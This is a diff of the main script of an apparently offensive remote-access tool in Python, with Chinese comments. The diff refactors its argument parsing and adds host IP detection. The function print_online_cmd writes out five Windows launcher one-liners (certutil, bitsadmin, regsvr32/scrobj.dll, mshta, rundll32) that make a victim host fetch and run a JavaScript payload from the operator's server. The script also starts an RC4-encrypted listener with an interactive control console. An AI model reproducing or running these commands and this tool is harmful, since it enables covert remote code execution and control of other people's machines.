@@ -4,10 +4,9 @@ import os
 import random
 import string
 import argparse
-from lib.shell import Shell
-from lib.session import Session
+import socket
+from collections import ChainMap
 from lib.server import Server
-from lib.handler import JSCatServer
 from lib.log import Log
 from lib.color import BOLD
 
@@ -15,15 +14,15 @@ from lib.color import BOLD
 上线方式
 '''
 
-
 def print_online_cmd(host, port):
+    print('-' * 80)
     print('[*]Execute in host:')
-    print('{} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
-    print('{} /transfer n http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('bitsadmin'), host, port))
-    print('{} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
-    print('''{} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format(BOLD('mshta'), host, port))
-    print('{} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'.format(BOLD('rundll32'), host, port))
-
+    print('[1] {} -urlcache -split -f http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('certutil'), host, port))
+    print('[2] {} /transfer n http://{}:{}/init css.js && cscript //nologo css.js'.format(BOLD('bitsadmin'), host, port))
+    print('[3] {} /s /n /u /i:http://{}:{}/file.sct scrobj.dll'.format(BOLD('regsvr32'), host, port))
+    print('''[4] {} javascript:eval("x=new ActiveXObject('WinHttp.WinHttpRequest.5.1');x.open('GET','http://{}:{}/init',false);x.send();eval(x.responseText)")(window.close())'''.format(BOLD('mshta'), host, port))
+    print('[5] {} javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://{}:{}/init",false);x.send();eval(x.responseText);window.close();'.format(BOLD('rundll32'), host, port))
+    print('-' * 80)
 
 '''
 RC4加密的key
@@ -45,23 +44,24 @@ def get_rc4_key(new_key):
 
     return key
 
-
-def run(ip, port, new_key, sleep_time):
+def run(cmdArguments):
     # 获取当前使用的rc4加密key
-    rc4_key = get_rc4_key(new_key)
+    rc4_key = get_rc4_key(cmdArguments.get('new_key'))
     Log.log_message(
         '[*]server cipher key: {}'.format(BOLD(rc4_key)), log_type=Log.SERVER)
+    cmdArguments['new_key'] = rc4_key
     # 启动http监听服务
-    session = Session()
-    shell = Shell(session)
-    httpd = Server(ip, port, JSCatServer, session, shell, rc4_key, sleep_time)
-    httpd.start()
-    Log.log_message(
-        '[*]server running in  {}:{}...'.format(BOLD('0.0.0.0'), BOLD(port)), log_type=Log.SERVER)
-    Log.log_message(
-        '[*]host connect ip is {}:{}...'.format(BOLD(ip), BOLD(port)), log_type=Log.SERVER)
+    host = cmdArguments['host']
+    port = int(cmdArguments['port'])
 
-    print_online_cmd(ip, port)
+    httpd = Server(cmdArguments)
+    httpd.start()
+
+    Log.log_message(
+        '[*]host connect ip is {}:{}...'.format(BOLD(host), BOLD(port)), log_type=Log.SERVER)
+
+    print_online_cmd(host, port)
+
     # 控制台命令输入
     try:
         while True:
@@ -71,6 +71,26 @@ def run(ip, port, new_key, sleep_time):
     except KeyboardInterrupt:
         httpd.shutdown()
         Log.log_message('server shutdown', log_type=Log.SERVER)
+
+def getDefaultHost():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+        sock.connect(('8.8.8.8', 80))
+        return sock.getsockname()[0]
+
+def argsParser():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--host', 
+                        help='server foreign ip for host connect')
+    parser.add_argument('-p', '--port',
+                        help='server listening port,default is 6600')
+    parser.add_argument('--new_key', action="store_true",
+                        help="generate new rc4 key to encrypt data")
+    parser.add_argument('-s', '--sleep_time',
+                        help='set host sleep time in second,default is 5')
+
+    argsDefault = {'host': getDefaultHost(), 'port': 6600, 'new_key': False, 'sleep_time': 5}
+    
+    return ChainMap({k:v for k, v in vars(parser.parse_args()).items() if v}, argsDefault)
 
 
 def print_banner():
@@ -87,19 +107,7 @@ _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 
 def main():
     print_banner()
-
-    parser = argparse.ArgumentParser()
-    parser.add_argument('--host', required=True,
-                        help='server foreign ip for host connect')
-    parser.add_argument('-p', '--port', default=6600,
-                        help='server listening port,default is 6600')
-    parser.add_argument('--new_key', default=False, action="store_true",
-                        help="generate new rc4 key to encrypt data")
-    parser.add_argument('-s', '--sleep_time', default=5,
-                        help='set host sleep time in second,default is 5')
-    args = parser.parse_args()
-
-    run(args.host, int(args.port), args.new_key, args.sleep_time)
+    run(argsParser())
 
 
 if __name__ == '__main__':
